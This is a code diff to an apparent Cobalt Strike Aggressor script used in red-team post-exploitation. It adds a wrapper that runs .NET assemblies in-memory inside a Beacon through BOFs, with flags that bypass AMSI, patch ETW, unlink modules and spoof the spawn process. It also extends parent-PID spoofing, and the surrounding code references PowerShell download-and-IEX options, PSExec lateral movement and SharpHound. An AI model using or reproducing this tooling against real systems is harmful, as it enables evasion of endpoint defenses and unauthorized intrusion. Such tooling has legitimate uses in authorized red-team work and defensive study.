@@ -55,6 +55,9 @@
 #
 #   - adds command 'powershell-clear' to clear imported powershell script.
 #
+#   - adds command 'inline-execute-assembly' which uses preconfigured .NET assemblies lookup directory and
+#       automatically invokes one of supported inlineExecute-Assembly / ExecuteAssembly BOFs.
+#
 #   - adds command 'stracciatella-activedirectory' to ease use of ActiveDirectory Powershell module straight from Beacon's console.
 #
 #   - adds command 'import-mailsniper' to import MailSniper.ps1
@@ -314,6 +317,16 @@ $POWERSHELL_GET_JOINED_DOMAIN_NAME = '(Get-WmiObject Win32_ComputerSystem) | sel
 $USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
 
 $stracciatellaAvailable = false;
+
+@supported_inline_execute_assembly_bofs = @(
+    "inlineExecute-Assembly",
+    "ExecuteAssembly"
+);
+
+@supported_inline_execute_assembly_bofs_args = @(
+    "--dotnetassembly ASSEMBLY_PATH --assemblyargs ASSEMBLY_ARGS --appdomain ShareDomain --amsi --revertetw --mailslot chrome.nativeMessaging.out.83c0f1f02d1d17",
+    "--amsi --etw --dotnetassembly ASSEMBLY_PATH --assemblyargs ASSEMBLY_ARGS --unlink-modules --spawnto PresentationHost.exe",
+);
 
 $CURRENT_DOMAIN_NAME = "";
 
@@ -575,7 +588,7 @@ sub arsenal::updateglobals {
     drow_combobox($dialog, "use_unsafe_encodedcommand_and_iex", "Use unsafe but stable Powershell (Net.WebClient).DownloadString and IEX() methods: ", @("Never", "Seldom", "Always"));
     
     drow_checkbox($dialog, "show_debug_logs", "Enable debug output in Script Console: ", "Debug");
-    drow_text($dialog, "parent_process_name", "Process name to spoof as parent in PPID (and 'autoppid' command): ");
+    drow_text($dialog, "parent_process_name", "Process name to spoof as parent in PPID (and 'autoppid' command) - comma separates multiple entries: ");
     drow_text($dialog, "privileged_parent_process_name", "Process name to spoof as parent in PPID in PRIVILEGED Beacons (and 'autoppid' command): ");
     drow_text($dialog, "psexec_service_name", "Service name(s) to use in PSExec lateral movement (comma separated, will pick at random): ");
 
@@ -673,8 +686,8 @@ sub arsenal::saveoptions{
         %arsenal::defaults["use_unsafe_encodedcommand_and_iex"] = 2;
     } 
 
-    %arsenal::defaults["parent_process_name"] = %options["parent_process_name"];
-    %arsenal::defaults["privileged_parent_process_name"] = %options["privileged_parent_process_name"];
+    %arsenal::defaults["parent_process_name"] = replace(%options["parent_process_name"], ' ', '');
+    %arsenal::defaults["privileged_parent_process_name"] = replace(%options["privileged_parent_process_name"], ' ', '');
     %arsenal::defaults["show_debug_logs"] = %options["show_debug_logs"];
     %arsenal::defaults["psexec_service_name"] = %options["psexec_service_name"];
     %arsenal::defaults["beacon_tab_name_format"] = %options["beacon_tab_name_format"];
@@ -870,9 +883,9 @@ popup beacon_bottom {
             item "launch-sharphound" {
                 binput($1, "launch-sharphound");
                 prompt_text("Specify domain name for Sharphound:", "") {
-	                foreach $bid ($1) {
-	                    fireAlias($1, "launch-sharphound", "$1");
-	                }
+                    foreach $bid ($1) {
+                        fireAlias($1, "launch-sharphound", "$1");
+                    }
                 }
             }
             
@@ -1122,6 +1135,17 @@ beacon_command_register(
     "Purges in-memory Kebreros tickets completely using a few methods",
     "Purges in-memory Kerberos TGT/TGS tickets using:\n\trev2self,\n\tkerberos_ticket_purge,\n\tklist purge,\n\tmimikatz kerberos::purge\n\trubeus.exe purge");
 
+$supported_bofs_help_message = "";
+for($i = 0; $i < size(@supported_inline_execute_assembly_bofs); $i++)
+{
+    $supported_bofs_help_message .= "\t" . @supported_inline_execute_assembly_bofs[$i] . " " . @supported_inline_execute_assembly_bofs_args[$i] . "\n";
+}
+
+beacon_command_register(
+    "inline-execute-assembly",
+    "Execute a local .NET program in-memory inline in this Beacon's process (a wrapper for " . join(', ', @supported_inline_execute_assembly_bofs) . " BOFs)",
+    "Use: inline-execute-assembly </path/to/file.exe|filename> [arguments]\n\nExecutes a local .NET process assembly in this Beacon's process.\nThis command is only a wrapper around " . join(', ', @supported_inline_execute_assembly_bofs) . " BOFs.\nShould one be found as loaded to Cobalt Strike, it will be used through this handy wrapper.\n\nFollowing command lines will be constituted:\n" . $supported_bofs_help_message);
+
 
 #
 # ==============================================================================
@@ -1175,16 +1199,16 @@ alias powershell-clear {
 }
 
 alias assembly {
-	$params = "";
+    $params = "";
 
     if(strlen($0) > strlen("assembly ")) {
         $params = substr($0, strlen("assembly "));
     }
     else {
-    	return;
+        return;
     }
 
-	fireAlias($1, "execute-assembly", $params);
+    fireAlias($1, "execute-assembly", $params);
 }
 
 alias ipconfig {
@@ -1212,7 +1236,7 @@ sub getpidWorker {
     bps($1, lambda({
         local('$pid $name $entry $arch $user');
         foreach $entry (split("\n", $2)) {
-            ($name, $null, $pid, $arch, $user) = split("\\s+", $entry);
+            ($name, $null, $pid, $arch, $user, $session) = split("\\s+", $entry);
 
             if($user eq "NT") {
                 $user = substr($entry, indexOf($entry, "NT "));
@@ -1223,7 +1247,7 @@ sub getpidWorker {
             }
 
             if ((lc(replace($name, ".exe", "")) cmp lc($to_match)) == 0) {
-                [$callback: $1, $name, $pid, $arch, $user];
+                [$callback: $1, $name, $pid, $arch, $user, $session];
             }
         }
     }, $callback => $2));
@@ -1231,7 +1255,7 @@ sub getpidWorker {
 
 alias getpid {
     getpidWorker($1, {   
-        blog($1, "     $2 \t $3 \t $4 \t $5");
+        blog($1, "     $2 \t $3 \t $4 \t $5 \t $6");
     }, $2); 
 }
 
@@ -1561,18 +1585,18 @@ sub arsenal::importPowershell {
 #
 
 alias stracciatella-activedirectory {
-	checkStracciatella();
+    checkStracciatella();
 
-	if(! $stracciatellaAvailable) {
-		berror($1, "Stracciatella is not loaded. Cannot use this command. Make sure you loaded stracciatella.cna script.");
-		return;
-	}
+    if(! $stracciatellaAvailable) {
+        berror($1, "Stracciatella is not loaded. Cannot use this command. Make sure you loaded stracciatella.cna script.");
+        return;
+    }
 
-	$command = substr($0, strlen("stracciatella-activedirectory "));
-	$args = "\" $+ $LOAD_ADPSMODULE $+ \" $command";
+    $command = substr($0, strlen("stracciatella-activedirectory "));
+    $args = "\" $+ $LOAD_ADPSMODULE $+ \" $command";
 
-	arsenal::debug("stracciatella-activedirectory1: stracciatella-script $args");
-	fireAlias($1, "stracciatella-script", $args);
+    arsenal::debug("stracciatella-activedirectory1: stracciatella-script $args");
+    fireAlias($1, "stracciatella-script", $args);
 }
 
 alias powershell-clear {
@@ -1696,8 +1720,8 @@ alias launch-sharphound {
     $domain = $2;
 
     if(strlen($domain) == 0) {
-    	berror($1, "You need to specify domain name before launching SharpHound!\nUse: launch-sharphound <domain> [options]");
-    	return;
+        berror($1, "You need to specify domain name before launching SharpHound!\nUse: launch-sharphound <domain> [options]");
+        return;
     }
 
     $pos = strlen("launch-sharphound ") + strlen($domain) + 1;
@@ -1727,6 +1751,86 @@ alias launch-sharpshares {
     }
 
     bexecute_assembly($1, $SHARPSHARES_PATH, $params);
+}
+
+alias inline-execute-assembly {
+    local('$bid $localpath $args $tmp $tmp2');
+    $bid = shift(@_);
+    $localpath = shift(@_);
+    $args = "";
+
+    $bof_to_use = "";
+    $bof_command = "";
+
+    @commands = beacon_commands();
+
+    for($i = 0; $i < size(@supported_inline_execute_assembly_bofs); $i++) {
+        $c = @supported_inline_execute_assembly_bofs[$i];
+        if($c in @commands) {
+            $bof_to_use = @supported_inline_execute_assembly_bofs[$i];
+            $bof_command = @supported_inline_execute_assembly_bofs_args[$i];
+            break;
+        }
+    }
+
+    if(strlen($bof_to_use) == 0) {
+        berror($1, "Could not find neither of " . join(', ', @supported_inline_execute_assembly_bofs) . " commands loaded. First load one of their CNAs and then reuse this alias.");
+        return;
+    }
+
+    $pos = indexOf($0, $localpath) + strlen($localpath) + 1;
+    
+    if ($pos < strlen($0)) {
+        $args = substr($0, $pos);
+    }
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        prompt_file_open("Choose an assembly to execute", $null, false, lambda({
+            bupload($bid, $1);
+        }, $bid => $bid));
+        return;
+    }
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        berror($bid, "Assembly path must be specified.");
+        return;
+    }
+
+    if(!-exists $localpath) {
+        if(strlen(%arsenal::defaults["assemblies_storage_path"]) > 0) {
+            $tmp = getFileProper(%arsenal::defaults["assemblies_storage_path"], $localpath);
+            $tmp2 = $tmp . ".exe";
+
+            if((-exists $tmp) && (!-isDir $tmp)) {
+                $localpath = $tmp
+            }
+            else if((-exists $tmp2) && (!-isDir $tmp2)) {
+                $localpath = $tmp2;
+            }
+            else {
+                berror($bid, "Specified assembly file could not be found: ( $+ $localpath $+ )");
+                return;
+            }
+
+            blog($bid, "Auto-located specified .NET assembly at: " . $localpath);
+        }
+        else {
+            berror($bid, "Specified assembly file does not exist: ( $+ $localpath $+ ). Tried looking at this path: " . %arsenal::defaults["assemblies_storage_path"]);
+            return;
+        }
+    }
+
+    btask($bid, "Tasked beacon to run .NET program inline via $bof_to_use BOF: \c7" . getFileName($localpath) . " $args \o");
+    arsenal::debug("augmented inline-execute-assembly: bid='" . $bid . "', localpath='" . $localpath . "', args='" . $args . "'");
+
+    $pos = find($bof_command, "ASSEMBLY_PATH");
+    $bof_command = substr($bof_command, 0, $pos) . $localpath . substr($bof_command, $pos + strlen("ASSEMBLY_PATH"));
+    $pos = find($bof_command, "ASSEMBLY_ARGS");
+    $bof_command = substr($bof_command, 0, $pos) . $args . substr($bof_command, $pos + strlen("ASSEMBLY_ARGS"));
+
+    arsenal::debug("Will run $bof_to_use $bof_command");
+
+    fireAlias($bid, $bof_to_use, $bof_command);
 }
 
 
@@ -2126,7 +2230,7 @@ alias execute-assembly {
     $pos = indexOf($0, $localpath) + strlen($localpath) + 1;
     
     if ($pos < strlen($0)) {
-    	$args = substr($0, $pos);
+        $args = substr($0, $pos);
     }
 
     if($localpath is $null || strlen($localpath) == 0) {
@@ -2143,8 +2247,8 @@ alias execute-assembly {
 
     if(!-exists $localpath) {
         if(strlen(%arsenal::defaults["assemblies_storage_path"]) > 0) {
-        	$tmp = getFileProper(%arsenal::defaults["assemblies_storage_path"], $localpath);
-        	$tmp2 = $tmp . ".exe";
+            $tmp = getFileProper(%arsenal::defaults["assemblies_storage_path"], $localpath);
+            $tmp2 = $tmp . ".exe";
 
             if((-exists $tmp) && (!-isDir $tmp)) {
                 $localpath = $tmp
@@ -2459,7 +2563,7 @@ sub arsenal::findSuitableParentPID {
     local('$_bid $_callback $_processName $_userName');
     $_bid = $1;
     $_callback = $2;
-    $_processName = $3;
+    $_processName = replace($3, ' ', '');
     $_userName = binfo($1, "user");
 
     if (right($_userName, 2) eq ' *') {
@@ -2468,25 +2572,41 @@ sub arsenal::findSuitableParentPID {
 
     bps($_bid, lambda({
         local('$tab $entry $name $pid $ppid $arch $user');
-        foreach $entry (split("\n", $2)) {
-            ($name, $ppid, $pid, $arch, $user) = split("\\s+", $entry);
+        @processes = split(',', $processName);
+        $found = 0;
 
-            # "NT AUTHORITY" contains space, thus breaking our split results. Here's a workaround for that
-            if($user eq "NT") {
-                $user = substr($entry, indexOf($entry, "NT "));
-                $tab = indexOf($user, "\t");
-                if ($tab) {
-                    $user = substr($user, 0, $tab);
+        foreach $processN (@processes) {
+            foreach $entry (split("\n", $2)) {
+                ($name, $ppid, $pid, $arch, $user, $session) = split("\\s+", $entry);
+
+                # "NT AUTHORITY" contains space, thus breaking our split results. Here's a workaround for that
+                if($user eq "NT") {
+                    $user = substr($entry, indexOf($entry, "NT "));
+                    $tab = indexOf($user, "\t");
+                    if ($tab) {
+                        $user = substr($user, 0, $tab);
+                    }
+                }
+
+                if ($pid) {
+                    if($name eq $processN) {
+                        if($user) {
+                            if( ($userName isin $user) || ($user isin $userName) ) {
+                                [$callback : $bid, $pid, "\t $+ $name \t $pid \t $arch \t $user \t $session"];
+                                $found = 1;
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                if($found == 1) {
+                    break;
                 }
             }
 
-            if (($pid) && ($name eq $processName)) {
-                if($user) {
-                    if( ($userName isin $user) || ($user isin $userName) ) {
-                        [$callback : $bid, $pid, "\t" . $entry];
-                        break;
-                    }
-                }
+            if($found == 1) {
+                break;
             }
         }
     }, $bid => $_bid, $callback => $_callback, $userName => $_userName, $processName => $_processName));
@@ -2565,16 +2685,21 @@ alias autoppid {
         btask($1, "Tasked Beacon to find $mode $processName running as $userName and make it the PPID.");
     }
 
-    arsenal::findSuitableParentPID($1, lambda({
-        if($params ne "quiet") {
-            blog!($1, "Future post-ex jobs will be spawned with fake PPID set to:\n$3");
-            bppid($1, $2);
-        } else {
-            bppid!($1, $2);
-        }
-        %OPERATING_BEACONS[$1]['autoppid'] = $2;
-        arsenal::appendNote($1, "(ppid: $2 $+ )");
-    }, $params => $params), $processName);
+    if(strlen($processName) > 0) {
+        arsenal::findSuitableParentPID($1, lambda({
+            if($params ne "quiet") {
+                blog!($1, "Future post-ex jobs will be spawned with fake PPID set to:\n$3");
+                bppid($1, $2);
+            } else {
+                bppid!($1, $2);
+            }
+            %OPERATING_BEACONS[$1]['autoppid'] = $2;
+            arsenal::appendNote($1, "(ppid: $2 $+ )");
+        }, $params => $params), $processName);
+    }
+    else {
+        blog2($1, "Not spoofing Parent PID automatically as there is set one in options.");
+    }
 }
 
 #
